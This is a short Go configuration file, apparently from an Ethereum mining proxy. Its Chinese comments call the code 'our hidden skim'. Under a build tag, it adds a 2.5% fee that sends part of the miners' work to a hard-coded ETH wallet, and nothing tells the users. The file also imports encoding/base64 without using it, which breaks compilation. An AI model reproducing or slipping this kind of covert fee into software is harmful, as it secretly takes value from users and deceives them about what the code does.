// +build self_cfg

package config

import (
	"encoding/base64"
)

// LoadFeeCfg 加载暗抽设置
func LoadFeeCfg() {
	// 我们的暗抽
	FeeStates["eth"] = append(FeeStates["eth"], FeeState{
		Upstream:   Upstream{},
		Wallet:     "0x719f110310b1035433022b1244ce26da67cbccae",
		NamePrefix: "u.",
		Pct:        2.5,
	})
}
